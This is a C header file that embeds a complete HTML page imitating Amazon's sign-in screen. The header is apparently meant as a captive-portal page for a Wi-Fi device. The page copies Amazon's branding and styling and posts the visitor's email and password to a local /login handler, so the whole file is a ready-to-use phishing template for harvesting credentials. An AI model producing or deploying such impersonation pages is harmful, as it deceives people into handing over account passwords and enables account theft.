#ifndef PORTAL_AMAZON_H
#define PORTAL_AMAZON_H

const char PORTAL_AMAZON_HTML[] = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: white;
            min-height: 100vh;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 20px 0;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #232f3e;
        }
        .logo span {
            color: #ff9900;
        }
        .container {
            max-width: 350px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 4px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 7px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 13px;
            border-top-color: #949494;
            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
        }
        input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,171,83,.5);
        }
        button {
            width: 100%;
            padding: 8px;
            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
            border: 1px solid #a88734;
            border-radius: 3px;
            font-size: 13px;
            cursor: pointer;
            color: #111;
        }
        button:hover {
            background: linear-gradient(to bottom, #f5d78e, #eeb933);
        }
        .terms {
            font-size: 12px;
            color: #555;
            margin-top: 16px;
        }
        .terms a {
            color: #0066c0;
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .divider {
            position: relative;
            text-align: center;
            margin: 20px 0;
        }
        .divider:before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #e7e7e7;
        }
        .divider span {
            background: white;
            padding: 0 10px;
            position: relative;
            color: #767676;
            font-size: 12px;
        }
        .create-btn {
            display: block;
            width: 100%;
            padding: 8px;
            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
            border: 1px solid #adb1b8;
            border-radius: 3px;
            text-align: center;
            text-decoration: none;
            color: #111;
            font-size: 13px;
        }
        .create-btn:hover {
            background: linear-gradient(to bottom, #e7eaf0, #d9dce1);
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">amazon<span>.com</span></div>
    </div>
    <div class="container">
        <h1>Sign in</h1>
        <form action="/login" method="GET">
            <div class="form-group">
                <label>Email or mobile phone number</label>
                <input type="email" name="email" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sign in</button>
        </form>
        <p class="terms">
            By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
        </p>
        <div class="divider"><span>New to Amazon?</span></div>
        <a href="#" class="create-btn">Create your Amazon account</a>
    </div>
</body>
</html>
)rawliteral";

#endif
